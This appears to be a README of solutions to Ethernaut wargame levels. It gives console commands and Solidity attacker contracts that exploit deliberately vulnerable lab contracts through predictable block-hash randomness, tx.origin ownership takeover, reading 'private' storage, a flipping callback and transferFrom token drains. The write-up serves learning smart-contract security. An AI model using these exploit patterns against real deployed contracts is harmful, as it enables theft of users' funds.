# ethernaut-challenges

### challenge 1
await contract.contribute({value: toWei("0.000001")})

await contract.sendTransaction({value: toWei("0.000001")})

await contract.withdraw()

### challenge 2
Constructor spelled incorrectly


await contract.Fal1out({value: toWei("0.00000001")})

### challenge 3

```
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/contracts/utils/math/SafeMath.sol";

interface CoinFlip {
    function flip(bool) external;
}

contract Attack {
    address cF = 0x30C7A39F911f075F45434357af31Ec5aaA9828bb;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    uint256 public value;

    function attack() public returns (uint256){
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        CoinFlip(cF).flip(side);

        return blockValue;
    }
}
```

### challenge 4

```
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address) external;
}

contract Attack {
    address telephoneAddress = 0x0bDb4C476e8719Db25Baac7Ab796008023C5Ed3A;
    address myAddress = 0xD0eba5f813cEfa1FD5f60E11feCD84f39a9dDA88;

    function attack() public {
        Telephone(telephoneAddress).changeOwner(myAddress);
    }
}
```

### challenge 5

Underflow and has to be called by someone else

### challenge 6

await window.web3.eth.sendTransaction({
    from: '0xD0eba5f813cEfa1FD5f60E11feCD84f39a9dDA88',
    to: '0x601D70A2fFAC4C90A3D4c4931564EE3d857d39F8',
    data: '0xdd365b8b'
})


### challenge 8

This will give you the pass:

await window.web3.eth.getStorageAt(contract.address,1)

### challenge 10

classic reentracy attack in withdraw

### challenge 11

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Elevator {
    function goTo(uint _floor) external;
}

contract Attacker {
    uint256 public nn;

    function attack(address _address) external {
        Elevator elevator = Elevator(_address);
        elevator.goTo(22);

    }

    function isLastFloor(uint) external returns (bool) {
        if (nn % 2 == 0) {
            nn += 1;
            return false;
        } else {
            nn += 1;
            return true;
        }      
    }
}
```

### challenge 12

pretty easy to read out the storage.

for whatever reason metamask would change my input data which took me one hour to figure out. works with remix.

### challenge 15

create smartcontract and give it the allowance for all tokens. then run the attacker contract below.

```
contract Attacker {
    function attack(address _address) public {
        address me =    0xD0eba5f813cEfa1FD5f60E11feCD84f39a9dDA88;
        address other = 0xEd6715D2172BFd50C2DBF608615c2AB497904803;
        NaughtCoin nc = NaughtCoin(_address);
        nc.transferFrom(me, other, nc.balanceOf(me));
    }
}
```
